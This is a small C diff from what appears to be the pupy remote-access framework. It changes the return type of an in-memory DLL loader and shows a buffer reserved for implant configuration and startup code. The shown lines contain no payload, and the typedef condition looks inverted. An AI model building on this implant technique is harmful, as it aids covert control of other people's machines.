@@ -10,7 +10,15 @@
 #include "base_inject.h"
 static char module_doc[] = "Builtins utilities for pupy";
 
-HMODULE _load_dll(const char *name, const char *bytes);
+#ifndef UINTPTR
+ #ifndef _WIN32
+   typedef DWORD UINTPTR;
+ #else
+   typedef ULONGLONG UINTPTR;
+ #endif
+#endif
+
+UINTPTR _load_dll(const char *name, const char *bytes);
 
 char pupy_config[32768]="####---PUPY_CONFIG_COMES_HERE---####\n"; //big array to have space for more config / code run at startup. scriptlets also takes more space !
 
@@ -131,3 +139,4 @@ initpupy(void)
     Py_INCREF(ExecError);
     PyModule_AddObject(pupy, "error", ExecError);
 }
+
